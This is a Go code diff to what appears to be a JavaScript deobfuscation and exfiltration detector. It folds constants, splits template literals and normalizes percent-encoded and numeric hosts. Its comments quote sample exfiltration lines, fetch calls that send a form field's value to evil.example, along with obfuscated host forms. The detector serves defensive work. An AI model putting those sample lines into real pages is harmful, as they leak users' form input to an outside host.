@@ -4,6 +4,8 @@ import (
 	"bytes"
 	"cmp"
 	"encoding/base64"
+	"fmt"
+	"net/url"
 	"regexp"
 	"slices"
 	"strconv"
@@ -170,6 +172,11 @@ func jsTokens(content []byte, regexAfterClose, module bool, from *brackets, carr
 			if sub {
 				if depth++; depth > maxBracketDepth {
 					deep = true
+				}
+				// The text before the first substitution is a string of its own: the start of
+				// the URL in fetch(`https://evil.example/p?d=${f.value}`).
+				if head := content[start+1 : next-2]; len(head) > 0 && len(head) <= maxLiteral {
+					out = append(out, jsToken{kind: 's', text: string(head)})
 				}
 			}
 			out = append(out, b.templateToken(sub))
@@ -872,7 +879,6 @@ func foldWork(content []byte, constants *foldConstants) ([]byte, int, int) {
 	from := constants.brackets
 	pattern, scanned, deep, ambiguous, carry := jsTokens(content, true, false, from, carryAt)
 	constants.brackets = carry
-	constants.code, constants.bare = render(pattern)
 	lastName := map[string]int{}
 	readings := []tokenReading{{toks: pattern, scanned: scanned, deep: deep}}
 	readings = append(readings, otherReadings(content, false, ambiguous, from)...)
@@ -901,6 +907,8 @@ func foldWork(content []byte, constants *foldConstants) ([]byte, int, int) {
 		out = append(out, more...)
 		tokens, steps = tokens+len(rd.toks), steps+n
 	}
+	// Rendered once the constants of this piece are folded, which it writes in place of names.
+	constants.code, constants.bare = render(substitute(pattern, constants, len(content)))
 	return out, tokens, steps
 }
 
@@ -912,6 +920,7 @@ func foldWork(content []byte, constants *foldConstants) ([]byte, int, int) {
 // the text of the strings, for the searches that a word inside a string must not satisfy.
 func render(toks []jsToken) (code, bare []byte) {
 	toks = ungroup(toks)
+	var joined strings.Builder
 	for k := 0; k < len(toks); k++ {
 		t := toks[k]
 		if k > 0 && (t.kind == 'n' || t.kind == '0') && (toks[k-1].kind == 'n' || toks[k-1].kind == '0') {
@@ -921,11 +930,13 @@ func render(toks []jsToken) (code, bare []byte) {
 		case 's':
 			// Literals joined by "+" are one string, written as a browser's URL parser reads it
 			// when it is one.
-			v := t.text
-			for k+2 < len(toks) && toks[k+1].text == "+" && toks[k+2].kind == 's' {
-				v += toks[k+2].text
+			joined.Reset()
+			joined.WriteString(t.text)
+			for k+2 < len(toks) && toks[k+1].text == "+" && toks[k+2].kind == 's' && joined.Len() < maxLiteral {
+				joined.WriteString(toks[k+2].text)
 				k += 2
 			}
+			v := joined.String()
 			if u, ok := whatwgURL(v); ok {
 				v = u
 			}
@@ -940,6 +951,34 @@ func render(toks []jsToken) (code, bare []byte) {
 	// A member named by a string is the member: navigator["sendBeacon"] is navigator.sendBeacon.
 	code = memberString.ReplaceAll(code, []byte(".$1"))
 	return code, bare
+}
+
+// maxSubstituted bounds the length of a constant written in place of its name in the rendering.
+const maxSubstituted = 256
+
+// substitute writes the constants folded so far in place of their names where they are read, as
+// strings, so that var u='https://evil.example/';fetch(u+f.value) renders as a fetch of that URL.
+// A name after a dot is a property, one before "=" is assigned to; the bytes written in all stay
+// within the piece's size.
+func substitute(toks []jsToken, constants *foldConstants, size int) []jsToken {
+	if len(constants.values) == 0 {
+		return toks
+	}
+	out := make([]jsToken, len(toks))
+	copy(out, toks)
+	budget := size
+	for k, t := range out {
+		if t.kind != 'n' || afterDot(toks[:k]) || k+1 < len(toks) && toks[k+1].text == "=" {
+			continue
+		}
+		v, ok := constants.values[t.text]
+		if !ok || len(v) > maxSubstituted || len(v) > budget {
+			continue
+		}
+		budget -= len(v)
+		out[k] = jsToken{kind: 's', text: v, at: t.at}
+	}
+	return out
 }
 
 // ungroup drops the brackets that only group a name or a member path: new((((Image))))() is
@@ -971,7 +1010,8 @@ func ungroup(toks []jsToken) []jsToken {
 				stack[len(stack)-1].onlyName = false
 			}
 		default:
-			if len(stack) > 0 && t.kind != 'n' && t.text != "." {
+			// A name, a member path, or one string.
+			if len(stack) > 0 && t.kind != 'n' && t.text != "." && (t.kind != 's' || last > stack[len(stack)-1].at) {
 				stack[len(stack)-1].onlyName = false
 			}
 		}
@@ -1020,12 +1060,64 @@ func whatwgURL(s string) (string, bool) {
 	if at := strings.LastIndexByte(host, '@'); at >= 0 {
 		host = host[at+1:]
 	}
-	if mapped, err := hostMapping.ToASCII(host); err == nil && mapped != "" {
-		host = mapped
-	} else {
+	// The host is percent-decoded before it is mapped, and a number in any of the forms an IPv4
+	// address takes is written dotted: https://%65vil%2Eexample and https://0x7f.1 name hosts.
+	if decoded, err := url.PathUnescape(host); err == nil {
+		host = decoded
+	}
+	switch {
+	case strings.HasPrefix(host, "["):
 		host = strings.ToLower(host)
+	default:
+		if mapped, err := hostMapping.ToASCII(host); err == nil && mapped != "" {
+			host = mapped
+		} else {
+			host = strings.ToLower(host)
+		}
+		if ip, ok := ipv4(host); ok {
+			host = ip
+		}
 	}
 	return prefix + host + rest[end:], true
+}
+
+// ipv4 reads a host as the URL parser reads an IPv4 address: one to four parts, each decimal,
+// octal (a leading 0) or hexadecimal (0x), the last filling the bytes left.
+func ipv4(host string) (string, bool) {
+	parts := strings.Split(strings.TrimSuffix(host, "."), ".")
+	if len(parts) == 0 || len(parts) > 4 {
+		return "", false
+	}
+	nums := make([]uint64, len(parts))
+	for i, p := range parts {
+		base, digits := 10, p
+		switch {
+		case strings.HasPrefix(p, "0x") || strings.HasPrefix(p, "0X"):
+			base, digits = 16, p[2:]
+		case len(p) > 1 && p[0] == '0':
+			base, digits = 8, p[1:]
+		}
+		if digits == "" {
+			digits = "0"
+		}
+		n, err := strconv.ParseUint(digits, base, 64)
+		if err != nil {
+			return "", false
+		}
+		nums[i] = n
+	}
+	last := nums[len(nums)-1]
+	if last >= 1<<(8*(5-len(nums))) {
+		return "", false
+	}
+	addr := last
+	for i, n := range nums[:len(nums)-1] {
+		if n > 255 {
+			return "", false
+		}
+		addr += n << (8 * (3 - i))
+	}
+	return fmt.Sprintf("%d.%d.%d.%d", addr>>24, addr>>16&255, addr>>8&255, addr&255), true
 }
 
 // memberString is a member read through a string that is a plain name.
